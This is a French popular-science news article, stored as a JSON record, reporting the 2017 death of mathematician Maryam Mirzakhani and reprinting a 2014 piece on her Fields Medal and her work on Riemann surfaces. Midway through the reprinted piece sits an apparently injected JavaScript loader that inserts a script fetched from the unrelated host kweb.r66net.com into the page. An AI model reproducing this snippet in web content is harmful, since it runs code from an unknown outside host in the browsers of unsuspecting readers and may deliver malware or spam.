{"title": "Décès de Maryam Mirzakhani, première femme ayant reçu la médaille Fields", "newspaper": "Futura Sciences", "author": "Laurent Sacco", "date_publi": "16/07/2017", "content": "Modèle dans un monde où les hommes sont encore majoritairement présents, la mathématicienne d'origine iranienne Maryam Mirzakhani vient de décéder des suites de son combat contre le cancer. Elle avait marqué les esprits en 2014 en devenant la première femme à recevoir l'équivalent du prix Nobel en mathématiques : la médaille Fields. Environ 108 milliards d'êtres humains conscients ont disparu de la surface de la  Terre  depuis l'arrivée d' Homo sapiens  dans la  biosphère  et l'on est aujourd'hui à un taux planétaire d'environ 150.000 décès par jour. Toutes ces morts nous sont bien sûr injustifiables mais il en est parfois certaines qui nous frappent plus que d'autres, comme celle de  John Nash , car elles nous rappellent douloureusement la fragilité humaine, contre laquelle aucune gloire ne protège. Il y a quelques jours, une triste nouvelle avait ainsi commencé à circuler sur les  réseaux sociaux . La mathématicienne d'origine iranienne Maryam Mirzakhani, la première femme lauréate de la médaille Fields en mathématiques, était atteinte d'un  cancer . Le 14 juillet 2017, le journal  Tehran Times  faisait savoir que la jeune femme âgée de 40 ans se battait en réalité contre la maladie depuis quatre ans et qu'après une période de  rémission , celle-ci était revenue avec, malheureusement, des  métastases  qui, cette fois-ci, avaient atteint la  moelle osseuse . Le 15 juillet, l' université de Stanford , où Maryam Mirzakhani était professeur, a annoncé qu'elle avait perdu la bataille contre le cancer et qu'elle en était morte. Il y a presque 150 ans, aussi pendant le mois de juillet, et à presque 40 ans, un autre mathématicien de renom mourrait également des suites d'une longue maladie. Mais, en l'occurrence, il s'agissait de la  tuberculose . Le lien avec Maryam Mirzakhani ? Le mathématicien en question n'était autre que  Bernhard Riemann  et c'est lui qui est à l'origine du domaine où se sont déployés les travaux de Maryam Mirzakhani : la théorie des  surfaces de Riemann . Dans cette courte vidéo en anglais, accompagnée de photos personnelles, la lauréate de la médaille Fields 2014, la mathématicienne iranienne Maryam Mirzakhani nous parle de sa trajectoire depuis son enfance ainsi que de ses travaux sur les surfaces de Riemann qui ressemblent parfois à des tores collés ensemble pour faire des bretzels. Pour obtenir une traduction en français, cliquez sur le rectangle avec deux barres horizontales en bas à droite. Les sous-titres en anglais devraient alors apparaître, si ce n'est pas déjà le cas. En passant simplement la souris sur le rectangle, vous devriez voir l'expression « Traduire les sous-titres ». Cliquez pour faire apparaître le menu du choix de la langue, choisissez « français », puis cliquez sur « OK ». ©  Futura avait consacré un article (voir ci-dessous) en 2014 à la mathématicienne lors de son attribution de la médaille Fields dans lequel plusieurs liens renvoyaient aussi bien à une interview qu'elle avait donnée en 2008 au célèbre  Clay Mathematics Institute  (dont elle avait été membre de 2004 à 2008) qu'à un article consacré à Maryam Mirzakhani sur le site incontournable du CNRS,  Images des Maths , par le mathématicien Étienne Ghys, directeur de recherche CNRS à l'École normale supérieure de Lyon. Dans son interview, la mathématicienne confessait qu'elle pensait lentement, qu'elle avait besoin de temps pour réfléchir aux problèmes qu'elle rencontrait dans ses recherches et que, pour elle,  « la majorité du temps, faire des maths [était] comme grimper une montagne, sans chemin et sans perspective devant » . Ces déclarations peuvent surprendre mais elles sont en réalité communes à bien des grands mathématiciens, notamment deux autres médaillés Fields français,  Laurent Schwartz  et  Alexandre Grothendieck . Ceux-ci ont expliqué qu'ils se sont sentis plus d'une fois lourds et maladroits face à des collègues dont la rapidité d'esprit et la virtuosité les impressionnaient, même si certains n'ont, au final, jamais rien fait qui soit de l'envergure des travaux de ces deux médaillés. Dans une autre interview donnée en 2014 au  Guardian , la chercheuse avait déclaré :  « Enfant, j'ai rêvé de devenir écrivain. Mon passe-temps favori était la lecture de romans. En fait, je lisais tout ce que je pouvais trouver. Je n'ai jamais envisagé que je poursuivrais une carrière en mathématiques jusqu'à la dernière année de lycée » .  Que disait déjà Ménandre il y a plus de 2.000 ans ?  « ὃν οἱ θεοὶ φιλοῦσιν, ἀποθνῄσκει νέος »   « Ceux que les dieux aiment meurent jeunes » Pour en savoir plus Maryam Mirzakhani, première femme à décrocher la médaille Fields  Article de  Laurent Sacco  publié le 13/08/2014 Le Congrès international des mathématiciens se tient cette année à Séoul, en Corée du Sud. Comme prévu, son ouverture a été l'occasion d'annoncer les noms des lauréats de la prestigieuse médaille Fields. La surprise est venue avec la mathématicienne iranienne Maryam Mirzakhani. C'est la première femme à recevoir la récompense que beaucoup considèrent comme le prix Nobel de mathématiques.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();   Comme tous les quatre ans depuis 1950, le Congrès international des mathématiciens (ICM,  International Congress of Mathematicians ) est l'occasion de l'attribution de la mythique médaille Fields que l'on considère comme l'équivalent du prix Nobel. Elle s'accompagne d'un prix d'environ 11.000 euros et les lauréats, quatre mathématiciens au plus, doivent être âgés de moins de 40 ans. Les premières médailles Fields ont en réalité été décernées en 1936 et, fait qui peut intriguer, depuis cette époque les 52 lauréats étaient tous des hommes. Cette année, l'ouverture de l'ICM s'accompagne d'un véritable coup de  tonnerre  puisqu'il a été annoncé officiellement qu'en plus du Franco-Brésilien Artur Avila, de l'Autrichien Martin Hairer et du Canado-Américain Manjul Bhargava, il y avait une femme parmi les lauréats. Il s'agit de la mathématicienne iranienne Maryam Mirzakhani. Le fameux journal  Quanta Magazine  de la  Simons Foudation  consacre d'ailleurs un article entier à la chercheuse. Pure produit du système d'éducation ultra-élitiste en Iran, la mathématicienne n'en a pas moins passé son doctorat à l'université d'Harvard aux États-Unis sous la direction d'un autre lauréat de la médaille Fields,  Curtis McMullen . Après avoir décroché son diplôme en 2004, elle passera quelques années à Princeton avant de s'établir à Stanford où elle est professeur depuis 2008. On peut trouver plus de détails sur sa trajectoire dans une  interview  qu'elle a accordée et dans la vidéo ci-dessus qui la complète. Née en 1977 à Téhéran, elle a fait partie d'une génération qu'elle décrit comme chanceuse, c'est-à-dire ceux dont l' adolescence  s'est déroulée après la guerre Iran-Irak. Initialement, elle n'avait pas l'intention de devenir mathématicienne et s'intéressait à tous les livres qui pouvaient lui tomber sous la main. Sortant de l'école primaire, elle a eu pendant un temps une expérience désagréable avec les mathématiques. Un de ses professeurs pensait même qu'elle n'était pas particulièrement douée, ce qui a été une source de découragement pour elle, brisant temporairement son intérêt naissant pour les mathématiques. Heureusement, cette situation ne dura pas longtemps et au cours des années qui allaient suivre, elle se révéla être un prodige en mathématiques. Elle décrochera deux fois la médaille d'or aux Olympiades internationales de mathématiques en 1994 à Hong Kong puis en 1995 à Toronto avec le plus haut score possible. Des surfaces complexes fertiles en applications Les travaux de la mathématicienne portent sur la géométrie et la  topologie  de ce qu'on appelle les  surfaces de Riemann , des surfaces comme celle d'une sphère ou d'un bretzel dont la description est étroitement liée aux fonctions dont les variables sont des nombres complexes (pour ceux qui voudraient en savoir plus, le mathématicien Étienne Ghys, directeur de recherche CNRS à l'École Normale Supérieure de Lyon, vient de consacrer un article entier à Maryam Mirzakhani sur le site incontournable du CNRS,  Images des Maths ). La chercheuse s'est plus particulièrement intéressée aux surfaces dotées d'une métrique dite hyperbolique. La surface d'une selle de cheval, avec sa courbure négative différente de celle d'une sphère qui est positive, possède une métrique hyperbolique. Avec son collègue le mathématicien  Alex Eskin  elle a établi des ponts remarquables entre la théorie des surfaces de Riemann et la théorie des systèmes dynamiques. Comme dans le cas des travaux de  Yakov Sinai  sur la théorie ergodique, les deux chercheurs ont utilisé le comportement des trajectoires de boules sur des billards de formes diverses pour explorer le comportement de certains de ces systèmes dynamiques. Situés à l'intersection de la géométrie différentielle, de la topologie et de l'analyse complexe les travaux de Maryam Mirzakhani relèvent de prime abord des mathématiques pures mais on sait bien que celles-ci ont souvent, parfois des décennies et même des siècles plus tard, des implications inattendues dans les sciences naturelles. Comme la théorie des surfaces de Riemann occupe une position très importante dans le cadre de la théorie de supercordes, et même dans divers secteurs de la  physique , on peut peut-être s'attendre à quelques surprises. D'autant plus que certains résultats obtenus par la mathématicienne sont déjà en connexion avec la  théorie des cordes  et les travaux de deux autres lauréats de la médaille Fields sur le sujet,  Edward Witten et Maxim Kontsevich . On peut penser que cette première attribution d'une médaille Fields à une femme servira à réduire l'écart entre le nombre de mathématiciens masculins et féminins comme l'espère la chercheuse qui a déclaré dans un communiqué de l'université de Stanford :  « c'est un grand honneur et je serais heureuse si cela encourage de jeunes femmes scientifiques et mathématiciennes » , ajoutant  « je suis convaincue que de nombreuses autres femmes recevront ce type de récompense dans les prochaines années » . ", "theme": "sciences"}